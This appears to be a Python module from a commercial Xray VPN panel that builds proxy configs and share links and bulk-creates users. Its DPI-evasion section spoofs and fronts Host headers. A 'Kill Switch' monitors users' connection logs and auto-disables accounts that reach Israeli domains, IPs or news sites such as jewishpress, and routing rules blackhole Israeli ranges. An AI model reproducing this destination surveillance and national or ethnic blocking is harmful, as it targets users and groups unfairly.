                 "-H", "Content-Type: application/json", "-d", payload],
                capture_output=True, text=True, timeout=15,
            )
            if result.returncode != 0 or not result.stdout.strip():
                continue
            results = json.loads(result.stdout)
            for r in results:
                q = r.get("query", "")
                if r.get("status") == "success":
                    _geo_cache[q] = {
                        "country": r.get("country", ""), "cc": r.get("countryCode", ""),
                        "city": r.get("city", ""), "org": r.get("org", ""),
                        "isp": r.get("isp", ""), "_t": now,
                    }
                else:
                    _geo_cache[q] = {"country": "", "cc": "", "city": "", "org": "", "isp": "", "_t": now}
        except Exception:
            for h in batch:
                if h not in _geo_cache:
                    _geo_cache[h] = {"country": "", "cc": "", "city": "", "org": "", "isp": "", "_t": now}


def get_geo(host):
    g = _geo_cache.get(host)
    if g:
        return {k: g[k] for k in ("country", "cc", "city", "org", "isp") if k in g}
    if not _IP_RE.match(host):
        hl = host.lower()
        if hl.endswith(".il"):
            return {"country": "Restricted Region", "cc": "IL", "city": "", "org": "Restricted domain", "isp": ""}
        if hl.endswith(".gov"):
            return {"country": "United States", "cc": "US", "city": "", "org": "US Government", "isp": ""}
        if hl.endswith(".mil"):
            return {"country": "United States", "cc": "US", "city": "", "org": "US Military", "isp": ""}
        for key, (cc, org) in _DOMAIN_CC.items():
            if key in hl and not key.startswith("."):
                return {"country": "", "cc": cc, "city": "", "org": org, "isp": ""}
    return {"country": "", "cc": "", "city": "", "org": "", "isp": ""}


def detect_alerts(sites_with_geo):
    alerts = []
    for s in sites_with_geo:
        cc = s.get("geo", {}).get("cc", "")
        host = s["host"]
        org = s.get("geo", {}).get("org", "")
        count = s.get("count", 0)
        if cc == "IL":
            alerts.append({"level": "danger", "host": host,
                           "msg": f'Connection to ISRAEL — {org or host} ({s["geo"].get("city", "")})',
                           "count": count})
        elif cc == "PS":
            alerts.append({"level": "danger", "host": host,
                           "msg": f"Connection to Palestine — {org or host}", "count": count})
        for wd in WARN_DOMAINS:
            if host.endswith(wd) or ("." + wd.lstrip(".")) in host:
                alerts.append({"level": "warning", "host": host,
                               "msg": f"Government/Military domain: {host}", "count": count})
                break
    return alerts


# ── Kill Switch ────────────────────────────────────────

_KILL_PATTERNS = [
    ".il", ".gov.il", ".co.il", ".org.il", ".net.il", ".ac.il", ".muni.il",
    ".idf.il", ".mossad.gov.il", ".shin-bet.gov.il",
    "israeli", "israel-", "idf.org", "mossad",
    "timesofisrael", "jpost.com", "ynetnews", "haaretz.com",
    "israeldefense", "idfblog", "jewishpress",
]
_KILL_CC = {"IL"}

_last_kill_check = 0


def kill_switch_check():
    """Scan access log for suspicious connections and auto-disable offending users."""
    global _last_kill_check
    if not settings.get("kill_switch_enabled", True):
        return []
    now_ts = time.time()
    if now_ts - _last_kill_check < 30:
        return []
    _last_kill_check = now_ts

    if not os.path.exists(ACCESS_LOG):
        return []

    try:
        size = os.path.getsize(ACCESS_LOG)
        read_size = min(size, 5 * 1024 * 1024)
        with open(ACCESS_LOG, "r", errors="ignore") as f:
            if size > read_size:
                f.seek(size - read_size)
                f.readline()
            lines = f.readlines()
    except Exception:
        return []

    _pat = re.compile(
        r"(\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})[\.\d]*\s+"
        r".*?(accepted)\s+\w+:([^:\s]+):(\d+)\s+email:\s*(\S+)"
    )

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name FROM users WHERE active=1")
    active_names = {r["name"] for r in c.fetchall()}
    conn.close()

    user_suspicious = defaultdict(list)
    for line in lines:
        m = _pat.search(line)
        if not m:
            continue
        ts, _, host, port, email = m.groups()
        username = email.replace("@vpn", "")
        if username not in active_names:
            continue
        hl = host.lower()
        suspicious = False
        reason = ""
        for pat in _KILL_PATTERNS:
            if hl.endswith(pat):
                suspicious = True
                reason = f"Domain match: {host} ({pat})"
                break
        if not suspicious and _IP_RE.match(host):
            geo = get_geo(host)
            if geo.get("cc") in _KILL_CC:
                suspicious = True
                reason = f"IP geo: {host} -> {geo.get('cc')} ({geo.get('country', '')})"

        if suspicious:
            user_suspicious[username].append({"host": host, "reason": reason, "ts": ts})

    if not user_suspicious:
        return []

    disabled = []
    conn = get_db()
    c = conn.cursor()
    for username, events in user_suspicious.items():
        c.execute("UPDATE users SET active=0 WHERE name=? AND active=1", (username,))
        if c.rowcount > 0:
            disabled.append(username)
            for ev in events[:5]:
                c.execute(
                    "INSERT INTO kill_switch_log (ts, username, host, reason) VALUES (?,?,?,?)",
                    (datetime.now().isoformat(), username, ev["host"], ev["reason"]),
                )
            _log_kill_switch(username, events[0]["reason"])
    conn.commit()
    conn.close()

    if disabled:
        sync_traffic_to_db()
        write_xray_config()

    return disabled


def _log_kill_switch(username, reason):
    try:
        with open(KILL_LOG, "a") as f:
            f.write(f"[{datetime.now().isoformat()}] KILLED: {username} — {reason}\n")
    except Exception:
        pass


# ── Config Builder (Xray: VMess + VLESS/Reality + CDN + Trojan + gRPC + HTTPUpgrade + SS2022 + VLESS-WS) ─

def _ss2022_user_key(user_uuid, method="2022-blake3-aes-128-gcm"):
    """Derive a per-user ShadowSocks 2022 key from UUID."""
    key_len = 16 if "128" in method else 32
    raw = hashlib.sha256(user_uuid.encode()).digest()[:key_len]
    return base64.b64encode(raw).decode()


def build_xray_config(active_users):
    # Dedupe by case-insensitive email to prevent Xray "User already exists" crash
    seen_emails = set()
    deduped = []
    for u in active_users:
        key = u[0].lower()
        if key not in seen_emails:
            seen_emails.add(key)
            deduped.append(u)
    active_users = deduped

    vmess_clients = [{"id": u[1], "alterId": 0, "email": f"{u[0]}@vpn"} for u in active_users]
    vless_clients = [{"id": u[1], "email": f"{u[0]}@vpn", "flow": "xtls-rprx-vision"} for u in active_users]
    vless_clients_noflow = [{"id": u[1], "email": f"{u[0]}@vpn"} for u in active_users]
    trojan_clients = [{"password": u[1], "email": f"{u[0]}@vpn"} for u in active_users]

    s = settings
    vmess_port = s.get("vmess_port", 443)
    vmess_sni = s.get("vmess_sni") or SNI_HOST
    vmess_ws_path = s.get("vmess_ws_path") or WS_PATH
    
    # DPI Evasion settings
    dpi_tcp_fragment = s.get("dpi_tcp_fragment", False)
    dpi_tls_fragment = s.get("dpi_tls_fragment", False)
    dpi_ip_fragment = s.get("dpi_ip_fragment", False)
    dpi_tcp_keepalive = s.get("dpi_tcp_keepalive", False)
    dpi_dns_tunnel = s.get("dpi_dns_tunnel", False)
    dpi_icmp_tunnel = s.get("dpi_icmp_tunnel", False)
    dpi_domain_front = s.get("dpi_domain_front", False)
    dpi_cdn_front = s.get("dpi_cdn_front", "")
    # Advanced DPI Evasion
    dpi_http_host_spoof = s.get("dpi_http_host_spoof_enabled", False)
    dpi_http_host_spoof_domain = s.get("dpi_http_host_spoof_domain", "chat.deepseek.com")
    dpi_ws_host_front = s.get("dpi_ws_host_front_enabled", False)
    dpi_ws_host_front_domain = s.get("dpi_ws_host_front_domain", "rubika.ir")
    dpi_cdn_host_front = s.get("dpi_cdn_host_front_enabled", False)
    dpi_cdn_host_front_domain = s.get("dpi_cdn_host_front_domain", "web.splus.ir")
    dpi_bug_host = s.get("dpi_bug_host_enabled", False)
    dpi_bug_host_domain = s.get("dpi_bug_host_domain", "chat.deepseek.com")

    # ── HTTP Host Header Spoofing: Replace Host header with a fake domain
    # to bypass DPI that inspects HTTP headers. The SNI remains the real domain,
    # but the HTTP Host header shows a whitelisted domain.
    vmess_ws_headers = {"Host": vmess_sni}
    if dpi_http_host_spoof:
        vmess_ws_headers["Host"] = dpi_http_host_spoof_domain
        # Also add X-Forwarded-Host for extra stealth
        vmess_ws_headers["X-Forwarded-Host"] = vmess_sni

    # ── WebSocket Host Fronting: Use different Host for WS upgrade
    # than the TLS SNI. DPI compares SNI with HTTP Host, so we spoof Host.
    if dpi_ws_host_front:
        vmess_ws_headers["Host"] = dpi_ws_host_front_domain
        vmess_ws_headers["X-Forwarded-Host"] = vmess_sni

    # ── Bug Host / Host Header Injection: Inject multiple Host headers
    # to confuse DPI pattern matching. Some DPI systems only check the first
    # Host header, so we inject a fake one first.
    if dpi_bug_host:
        vmess_ws_headers["Host"] = dpi_bug_host_domain
        vmess_ws_headers["X-Original-Host"] = vmess_sni

    inbounds = [
        {
            "tag": "vmess-in", "port": vmess_port, "listen": "0.0.0.0",
            "protocol": "vmess",
            "settings": {"clients": vmess_clients},
            "streamSettings": {
                "network": "ws", "security": "tls",
                "tlsSettings": {
                    "allowInsecure": True,
                    "certificates": [{
                        "certificateFile": "/usr/local/etc/xray/cert.crt",
                        "keyFile": "/usr/local/etc/xray/cert.key",
                    }],
                },
                "wsSettings": {"path": vmess_ws_path, "headers": vmess_ws_headers},
            },
        },
        {
            "tag": "api", "port": API_PORT, "listen": "127.0.0.1",
            "protocol": "dokodemo-door",
            "settings": {"address": "127.0.0.1"},
        },
    ]

    if s.get("reality_private_key"):
        vless_port = s.get("vless_port", 2053)
        inbounds.append({
            "tag": "vless-reality", "port": vless_port, "listen": "0.0.0.0",
            "protocol": "vless",
            "settings": {"clients": vless_clients, "decryption": "none"},
            "streamSettings": {
                "network": "tcp", "security": "reality",
                "realitySettings": {
                    "show": False,
                    "dest": s.get("reality_dest", "127.0.0.1:443"),
                    "xver": 0,
                    "serverNames": [
                        s.get("reality_sni", "www.aparat.com"),
                        "aparat.com",
                    ],
                    "privateKey": s["reality_private_key"],
                    "shortIds": [s.get("reality_short_id", ""), "",
                                 "0123456789abcdef"],
                },
            },
        })

    if s.get("cdn_enabled") and s.get("cdn_domain"):
        cdn_port = s.get("cdn_port", 2082)
        cdn_path = s.get("cdn_ws_path", "/cdn-ws")
        # ── CDN Host Header Fronting: Use a fake Host header to bypass
        # DPI that inspects CDN traffic. The real domain is in the SNI,
        # but the HTTP Host header shows a whitelisted domain.
        cdn_headers = {"Host": s["cdn_domain"]}
        if dpi_cdn_host_front:
            cdn_headers["Host"] = dpi_cdn_host_front_domain
            cdn_headers["X-Forwarded-Host"] = s["cdn_domain"]
        inbounds.append({
            "tag": "vmess-cdn", "port": cdn_port, "listen": "0.0.0.0",
            "protocol": "vmess",
            "settings": {"clients": vmess_clients},
            "streamSettings": {
                "network": "ws",
                "wsSettings": {"path": cdn_path, "headers": cdn_headers},
            },
        })

    # ── Trojan + TLS ──
    if s.get("trojan_enabled"):
        trojan_port = s.get("trojan_port", 2083)
        inbounds.append({
            "tag": "trojan-in", "port": trojan_port, "listen": "0.0.0.0",
            "protocol": "trojan",
            "settings": {"clients": trojan_clients},
            "streamSettings": {
                "network": "tcp", "security": "tls",
                "tlsSettings": {
                    "allowInsecure": True,
                    "certificates": [{
                        "certificateFile": "/usr/local/etc/xray/cert.crt",
                        "keyFile": "/usr/local/etc/xray/cert.key",
                    }],
                },
            },
        })

    # ── VMess + gRPC + TLS ──
    if s.get("grpc_enabled"):
        grpc_port = s.get("grpc_port", 2054)
        grpc_svc = s.get("grpc_service_name") or "GunService"
        inbounds.append({
            "tag": "vmess-grpc", "port": grpc_port, "listen": "0.0.0.0",
            "protocol": "vmess",
            "settings": {"clients": vmess_clients},
            "streamSettings": {
                "network": "grpc", "security": "tls",
                "tlsSettings": {
                    "allowInsecure": True,
                    "certificates": [{
                        "certificateFile": "/usr/local/etc/xray/cert.crt",
                        "keyFile": "/usr/local/etc/xray/cert.key",
                    }],
                },
                "grpcSettings": {"serviceName": grpc_svc, "multiMode": True},
            },
        })

    # ── VMess + HTTPUpgrade + TLS ──
    if s.get("httpupgrade_enabled"):
        hu_port = s.get("httpupgrade_port", 2055)
        hu_path = s.get("httpupgrade_path") or "/httpupgrade"
        inbounds.append({
            "tag": "vmess-httpupgrade", "port": hu_port, "listen": "0.0.0.0",
            "protocol": "vmess",
            "settings": {"clients": vmess_clients},
            "streamSettings": {
                "network": "httpupgrade", "security": "tls",
                "tlsSettings": {
                    "allowInsecure": True,
                    "certificates": [{
                        "certificateFile": "/usr/local/etc/xray/cert.crt",
                        "keyFile": "/usr/local/etc/xray/cert.key",
                    }],
                },
                "httpupgradeSettings": {"path": hu_path, "host": vmess_sni},
            },
        })

    # ── ShadowSocks 2022 ──
    if s.get("ss2022_enabled") and s.get("ss2022_server_key"):
        ss_port = s.get("ss2022_port", 2056)
        ss_method = s.get("ss2022_method", "2022-blake3-aes-128-gcm")
        ss_clients = [{
            "password": _ss2022_user_key(u[1], ss_method),
            "email": f"{u[0]}@vpn",
        } for u in active_users]
        inbounds.append({
            "tag": "ss2022-in", "port": ss_port, "listen": "0.0.0.0",
            "protocol": "shadowsocks",
            "settings": {
                "method": ss_method,
                "password": s["ss2022_server_key"],
                "clients": ss_clients,
                "network": "tcp,udp",
            },
        })

    # ── VLESS + WebSocket + TLS (CDN compatible, no Reality) ──
    if s.get("vless_ws_enabled"):
        vlws_port = s.get("vless_ws_port", 2057)
        vlws_path = s.get("vless_ws_path") or "/vless-ws"
        # ── Host Header Spoofing for VLESS+WS+TLS
        vlws_headers = {"Host": vmess_sni}
        if dpi_http_host_spoof:
            vlws_headers["Host"] = dpi_http_host_spoof_domain
            vlws_headers["X-Forwarded-Host"] = vmess_sni
        if dpi_ws_host_front:
            vlws_headers["Host"] = dpi_ws_host_front_domain
            vlws_headers["X-Forwarded-Host"] = vmess_sni
        if dpi_bug_host:
            vlws_headers["Host"] = dpi_bug_host_domain
            vlws_headers["X-Original-Host"] = vmess_sni
        inbounds.append({
            "tag": "vless-ws-tls", "port": vlws_port, "listen": "0.0.0.0",
            "protocol": "vless",
            "settings": {"clients": vless_clients_noflow, "decryption": "none"},
            "streamSettings": {
                "network": "ws", "security": "tls",
                "tlsSettings": {
                    "allowInsecure": True,
                    "certificates": [{
                        "certificateFile": "/usr/local/etc/xray/cert.crt",
                        "keyFile": "/usr/local/etc/xray/cert.key",
                    }],
                },
                "wsSettings": {"path": vlws_path, "headers": vlws_headers},
            },
        })

    # ── VLESS + XHTTP + Reality ──
    if s.get("vless_xhttp_enabled"):
        inbounds.append({
            "tag": "vless-xhttp-reality", "port": s.get("vless_xhttp_port", 2053), "listen": "0.0.0.0",
            "protocol": "vless",
            "settings": {"clients": vless_clients_noflow, "decryption": "none"},
            "streamSettings": {
                "network": "xhttp", "security": "reality",
                "realitySettings": {
                    "privateKey": s.get("vless_xhttp_reality_private_key", ""),
                    "shortIds": [s.get("vless_xhttp_reality_short_id", "")],
                    "dest": s.get("vless_xhttp_reality_dest", "digikala.com:443"),
                    "serverNames": [s.get("vless_xhttp_reality_sni", "digikala.com")],
                },
                "xhttpSettings": {
                    "path": s.get("vless_xhttp_path", "/xhttp-stream"),
                    "mode": s.get("vless_xhttp_mode", "auto"),
                },
            },
        })

    # ── VLESS + Reality + Vision ──
    if s.get("vless_vision_enabled"):
        inbounds.append({
            "tag": "vless-vision-reality", "port": s.get("vless_vision_port", 2058), "listen": "0.0.0.0",
            "protocol": "vless",
            "settings": {"clients": vless_clients, "decryption": "none"},
            "streamSettings": {
                "network": "tcp", "security": "reality",
                "realitySettings": {
                    "privateKey": s.get("vless_vision_reality_private_key", ""),
                    "shortIds": [s.get("vless_vision_reality_short_id", "")],
                    "dest": s.get("vless_vision_reality_dest", "objects.githubusercontent.com:443"),
                    "serverNames": [s.get("vless_vision_reality_sni", "objects.githubusercontent.com")],
                },
            },
        })

    # ── VLESS + Reverse Tunnel + Reality ──
    if s.get("vless_reverse_enabled"):
        inbounds.append({
            "tag": "vless-reverse-reality", "port": s.get("vless_reverse_port", 2059), "listen": "0.0.0.0",
            "protocol": "vless",
            "settings": {"clients": vless_clients_noflow, "decryption": "none"},
            "streamSettings": {
                "network": "tcp", "security": "reality",
                "realitySettings": {
                    "privateKey": s.get("vless_reverse_reality_private_key", ""),
                    "shortIds": [s.get("vless_reverse_reality_short_id", "")],
                    "dest": s.get("vless_reverse_reality_dest", "digikala.com:443"),
                    "serverNames": [s.get("vless_reverse_reality_sni", "digikala.com")],
                },
            },
        })

    # ── Trojan + WS/gRPC (CDN) ──
    if s.get("trojan_cdn_enabled"):
        # ── Host Header Spoofing for Trojan+CDN
        trojan_cdn_headers = {"Host": s.get("trojan_cdn_domain", "")}
        if dpi_cdn_host_front:
            trojan_cdn_headers["Host"] = dpi_cdn_host_front_domain
            trojan_cdn_headers["X-Forwarded-Host"] = s.get("trojan_cdn_domain", "")
        elif dpi_http_host_spoof:
            trojan_cdn_headers["Host"] = dpi_http_host_spoof_domain
            trojan_cdn_headers["X-Forwarded-Host"] = s.get("trojan_cdn_domain", "")
        inbounds.append({
            "tag": "trojan-cdn-ws", "port": s.get("trojan_cdn_port", 2083), "listen": "0.0.0.0",
            "protocol": "trojan",
            "settings": {"clients": trojan_clients},
            "streamSettings": {
                "network": "ws", "security": "tls" if s.get("trojan_cdn_tls_enabled", True) else "none",
                "wsSettings": {"path": s.get("trojan_cdn_ws_path", "/trojan-ws"), "headers": trojan_cdn_headers},
                "tlsSettings": {"serverName": s.get("trojan_cdn_sni", ""), "allowInsecure": True} if s.get("trojan_cdn_tls_enabled", True) else None,
            },
        })
        if s.get("trojan_cdn_grpc_enabled"):
            inbounds.append({
                "tag": "trojan-cdn-grpc", "port": s.get("trojan_cdn_grpc_port", 2060), "listen": "0.0.0.0",
                "protocol": "trojan",
                "settings": {"clients": trojan_clients},
                "streamSettings": {
                    "network": "grpc", "security": "tls" if s.get("trojan_cdn_tls_enabled", True) else "none",
                    "grpcSettings": {"serviceName": s.get("trojan_cdn_grpc_service", "TrojanService")},
                    "tlsSettings": {"serverName": s.get("trojan_cdn_sni", ""), "allowInsecure": True} if s.get("trojan_cdn_tls_enabled", True) else None,
                },
            })

    return {
        "log": {
            "access": ACCESS_LOG,
            "error": "/var/log/xray/error.log",
            "loglevel": "warning",
        },
        "stats": {},
        "api": {"tag": "api", "services": ["StatsService"]},
        "policy": {
            "levels": {"0": {"statsUserUplink": True, "statsUserDownlink": True}},
            "system": {"statsInboundUplink": True, "statsInboundDownlink": True},
        },
        "dns": {"servers": ["1.1.1.1", "8.8.8.8"]},
        "inbounds": inbounds,
        "outbounds": [
            {"tag": "api", "protocol": "freedom", "settings": {"domainStrategy": "UseIPv4"}},
            {"tag": "direct", "protocol": "freedom", "settings": {"domainStrategy": "UseIPv4"}},
            {"tag": "socks1", "protocol": "socks",
             "settings": {"servers": [{"address": "127.0.0.1", "port": 10080}]}},
            {"tag": "socks2", "protocol": "socks",
             "settings": {"servers": [{"address": "127.0.0.1", "port": 10180}]}},
            {"tag": "socks3", "protocol": "socks",
             "settings": {"servers": [{"address": "127.0.0.1", "port": 10181}]}},
            {"tag": "block", "protocol": "blackhole", "settings": {"response": {"type": "none"}}},
        ],
        "routing": {
            "domainStrategy": "AsIs",
            "balancers": [
                {
                    "tag": "lb",
                    "selector": ["socks1", "socks2", "socks3"],
                    "strategy": {"type": "random"},
                }
            ],
            "rules": [
                {"type": "field", "inboundTag": ["api"], "outboundTag": "api"},
                {
                    "type": "field",
                    "outboundTag": "block",
                    "domain": [
                        "regexp:\\.il$",
                        "domain:gov.il",
                        "domain:co.il",
                        "domain:org.il",
                        "domain:net.il",
                        "domain:ac.il",
                        "domain:muni.il",
                        "domain:idf.il",
                    ],
                },
                {
                    "type": "field",
                    "outboundTag": "block",
                    "ip": [
                        "2.52.0.0/14", "5.28.128.0/18", "5.29.0.0/16", "5.102.192.0/18",
                        "31.44.128.0/20", "31.154.0.0/16", "31.168.0.0/16",
                        "37.142.0.0/16", "46.116.0.0/15", "46.120.0.0/15", "46.210.0.0/16",
                        "62.0.0.0/16", "62.56.128.0/17", "62.90.0.0/16", "62.219.0.0/16",
                        "77.124.0.0/14", "79.176.0.0/13",
                        "80.74.96.0/19", "80.178.0.0/15", "80.230.0.0/16",
                        "81.5.0.0/18", "81.199.0.0/16", "81.218.0.0/16",
                        "82.80.0.0/15", "82.166.0.0/16", "83.130.0.0/16",
                        "84.94.0.0/15", "84.108.0.0/14", "84.228.0.0/15",
                        "85.64.0.0/15", "85.130.128.0/17", "85.250.0.0/16",
                        "87.68.0.0/14", "89.138.0.0/15",
                        "91.135.96.0/20", "93.172.0.0/15", "94.159.128.0/17", "94.188.128.0/17",
                        "95.35.0.0/16", "109.64.0.0/14", "109.160.128.0/17", "109.186.0.0/16", "109.253.0.0/16",
                        "128.139.0.0/16", "132.64.0.0/12", "138.134.0.0/16", "141.226.0.0/16",
                        "147.233.0.0/16", "147.235.0.0/16", "147.236.0.0/16", "149.49.0.0/16",
                        "176.12.128.0/17", "176.13.0.0/16", "176.228.0.0/14",
                        "192.114.0.0/16", "192.115.0.0/16", "192.116.0.0/16", "192.117.0.0/16", "192.118.0.0/16",
                        "194.90.0.0/16", "199.203.0.0/16", "207.232.0.0/18",
                        "212.25.64.0/18", "212.29.192.0/18", "212.143.0.0/16", "212.150.0.0/16",
                        "212.179.0.0/16", "212.199.0.0/16", "212.235.0.0/16",
                        "213.8.0.0/16", "213.57.0.0/16", "217.132.0.0/16",
                    ],
                },
                (
                    {"type": "field", "network": "tcp,udp", "balancerTag": "lb"}
                    if s.get("outbound_mode") == "socks_pool"
                    else {"type": "field", "network": "tcp,udp", "outboundTag": "direct"}
                ),
            ]
        },
    }


def write_standalone_configs(active_users):
    s = settings
    engine = get_protocol_engine(s)
    
    # Generate standalone configs for all users
    # Hysteria2
    if s.get("hysteria2_enabled"):
        try:
            os.makedirs("/etc/hysteria", exist_ok=True)
            cfg = engine.generate_hysteria2_config("dummy", s)
            cfg["users"] = {u[1]: s.get("hysteria2_password", "") for u in active_users}
            with open("/etc/hysteria/config.yaml", "w") as f:
                import yaml
                yaml.dump(cfg, f)
            os.system("systemctl restart hysteria-server")
        except Exception as e:
            logger.error(f"Failed to write Hysteria2 config: {e}")
            
    # TUIC
    if s.get("tuic_enabled"):
        try:
            os.makedirs("/etc/tuic", exist_ok=True)
            cfg = engine.generate_tuic_config("dummy", s)
            cfg["users"] = {u[1]: s.get("tuic_password", "") for u in active_users}
            with open("/etc/tuic/config.json", "w") as f:
                json.dump(cfg, f, indent=2)
            os.system("systemctl restart tuic-server")
        except Exception as e:
            logger.error(f"Failed to write TUIC config: {e}")
            
    # Add other standalone configs as needed...


def write_xray_config():
    os.makedirs("/usr/local/etc/xray", exist_ok=True)
    active_users = get_active_users_list()
    config = build_xray_config(active_users)
    with open(XRAY_CONFIG, "w") as f:
        json.dump(config, f, indent=2)
    os.system("systemctl restart v2ray")
    
    # Also write standalone configs
    threading.Thread(target=write_standalone_configs, args=(active_users,), daemon=True).start()


# legacy aliases
write_v2ray_config = write_xray_config


_last_limit_check = 0


def check_limits_with_live():
    global _last_limit_check
    now_ts = time.time()
    if now_ts - _last_limit_check < 8:
        return False
    _last_limit_check = now_ts

    live = query_v2ray_stats(reset=False)
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT name, traffic_limit_gb, traffic_used_gb, expire_at FROM users WHERE active=1"
    )
    rows = c.fetchall()
    now = datetime.now().isoformat()
    disabled = False
    for r in rows:
        live_data = live.get(r["name"], {"up": 0, "down": 0})
        live_gb = (live_data["up"] + live_data["down"]) / (1024**3)
        total = r["traffic_used_gb"] + live_gb
        if total >= r["traffic_limit_gb"] or r["expire_at"] < now:
            c.execute("UPDATE users SET active=0 WHERE name=? AND active=1", (r["name"],))
            if c.rowcount > 0:
                disabled = True
    conn.commit()
    conn.close()
    if disabled:
        sync_traffic_to_db()
        write_xray_config()
    return disabled


def apply_changes():
    sync_traffic_to_db()
    write_xray_config()


# ── Speed Limit Enforcement ───────────────────────────

def enforce_speed_limits():
    """Speed limits disabled."""
    return

def _rand_suffix(n=4):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _fmt_gb_slug(gb: float) -> str:
    # 1 -> 1g, 1.5 -> 1p5g, 0.25 -> 0p25g
    s = f"{gb}".rstrip("0").rstrip(".")
    s = s.replace(".", "p")
    return f"{s}g"


def _bulk_generate_users(prefix, count, traffic, days, numbered=True, start=1, pad=3, agent_id=None, speed_limit_up=0, speed_limit_down=0):
    """Create users in DB only; returns list of (name, uuid). No server apply by default."""
    prefix = (prefix or "group").strip()
    prefix = re.sub(r"[^a-zA-Z0-9_-]+", "-", prefix).strip("-") or "group"

    count = max(1, min(int(count), 500))
    traffic = float(traffic)
    days = int(days)
    start = int(start)
    pad = max(2, min(int(pad), 6))
    speed_limit_up = max(0, int(speed_limit_up))
    speed_limit_down = max(0, int(speed_limit_down))
    if traffic <= 0:
        raise ValueError("Traffic must be > 0")
    if days <= 0:
        raise ValueError("Days must be > 0")
    if start <= 0:
        raise ValueError("Start number must be > 0")

    expire = (datetime.now() + timedelta(days=days)).isoformat()
    created_at = datetime.now().isoformat()
    gb_slug = _fmt_gb_slug(traffic)

    conn = get_db()
    c = conn.cursor()
    created = []
    if numbered:
        i = start
        while len(created) < count:
            name = f"{prefix}-{gb_slug}-{i:0{pad}d}"
            i += 1
            user_uuid = str(uuid_lib.uuid4())
            try:
                c.execute(
                    "INSERT INTO users (name,uuid,traffic_limit_gb,expire_at,created_at,active,agent_id,speed_limit_up,speed_limit_down) VALUES (?,?,?,?,?,1,?,?,?)",
                    (name, user_uuid, traffic, expire, created_at, agent_id, speed_limit_up, speed_limit_down),
                )
                created.append((name, user_uuid))
            except sqlite3.IntegrityError:
                continue
    else:
        attempts = 0
        while len(created) < count:
            attempts += 1
            if attempts > count * 80:
                break
            name = f"{prefix}-{gb_slug}-{_rand_suffix(4)}"
            user_uuid = str(uuid_lib.uuid4())
            try:
                c.execute(
                    "INSERT INTO users (name,uuid,traffic_limit_gb,expire_at,created_at,active,agent_id,speed_limit_up,speed_limit_down) VALUES (?,?,?,?,?,1,?,?,?)",
                    (name, user_uuid, traffic, expire, created_at, agent_id, speed_limit_up, speed_limit_down),
                )
                created.append((name, user_uuid))
            except sqlite3.IntegrityError:
                continue
    conn.commit()
    conn.close()
    return created


# ── Link Generators ────────────────────────────────────

def vmess_link(name, user_uuid, server_ip=None):
    s = settings
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vmess_sni") or SNI_HOST
    ws_path = s.get("vmess_ws_path") or WS_PATH
    port = str(s.get("vmess_port", 443))
    address = _config_host(server_ip)
    cfg = json.dumps({
        "v": "2", "ps": f"{prefix}-{name}",
        "add": address, "port": port,
        "id": user_uuid, "aid": "0", "scy": "auto",
        "net": "ws", "type": "none",
        "host": sni, "path": ws_path, "allowInsecure": "1",
        "tls": "tls", "sni": sni, "alpn": "",
    })
    return "vmess://" + base64.b64encode(cfg.encode()).decode()


def vless_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("reality_public_key"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    address = _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": "reality",
        "encryption": "none",
        "pbk": s["reality_public_key"],
        "headerType": "none",
        "fp": "chrome",
        "type": "tcp",
        "flow": "xtls-rprx-vision",
        "sni": s.get("reality_sni", "chat.deepseek.com"),
        "sid": s.get("reality_short_id", ""),
    })
    port = s.get("vless_port", 2053)
    return f"vless://{user_uuid}@{address}:{port}?{params}#{prefix}-{name}"


def cdn_vmess_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("cdn_enabled") or not s.get("cdn_domain"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    cfg = json.dumps({
        "v": "2", "ps": f"{prefix}-CDN-{name}",
        "add": s["cdn_domain"], "port": "443",
        "id": user_uuid, "aid": "0", "scy": "auto",
        "net": "ws", "type": "none",
        "host": s["cdn_domain"], "path": s.get("cdn_ws_path", "/cdn-ws"),
        "tls": "tls", "sni": s["cdn_domain"], "alpn": "", "allowInsecure": "1",
    })
    return "vmess://" + base64.b64encode(cfg.encode()).decode()


def trojan_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("trojan_enabled"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vmess_sni") or SNI_HOST
    port = s.get("trojan_port", 2083)
    address = _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": "tls",
        "type": "tcp",
        "headerType": "none",
        "sni": sni,
        "allowInsecure": "1",
    })
    return f"trojan://{user_uuid}@{address}:{port}?{params}#{prefix}-Trojan-{name}"


def grpc_vmess_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("grpc_enabled"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vmess_sni") or SNI_HOST
    port = str(s.get("grpc_port", 2054))
    svc = s.get("grpc_service_name") or "GunService"
    address = _config_host(server_ip)
    cfg = json.dumps({
        "v": "2", "ps": f"{prefix}-gRPC-{name}",
        "add": address, "port": port,
        "id": user_uuid, "aid": "0", "scy": "auto",
        "net": "grpc", "type": "gun",
        "host": sni, "path": svc, "allowInsecure": "1",
        "tls": "tls", "sni": sni, "alpn": "h2",
    })
    return "vmess://" + base64.b64encode(cfg.encode()).decode()


def httpupgrade_vmess_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("httpupgrade_enabled"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vmess_sni") or SNI_HOST
    port = str(s.get("httpupgrade_port", 2055))
    hu_path = s.get("httpupgrade_path") or "/httpupgrade"
    address = _config_host(server_ip)
    cfg = json.dumps({
        "v": "2", "ps": f"{prefix}-HU-{name}",
        "add": address, "port": port,
        "id": user_uuid, "aid": "0", "scy": "auto",
        "net": "httpupgrade", "type": "none",
        "host": sni, "path": hu_path, "allowInsecure": "1",
        "tls": "tls", "sni": sni, "alpn": "",
    })
    return "vmess://" + base64.b64encode(cfg.encode()).decode()


def ss2022_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("ss2022_enabled") or not s.get("ss2022_server_key"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    method = s.get("ss2022_method", "2022-blake3-aes-128-gcm")
    server_key = s["ss2022_server_key"]
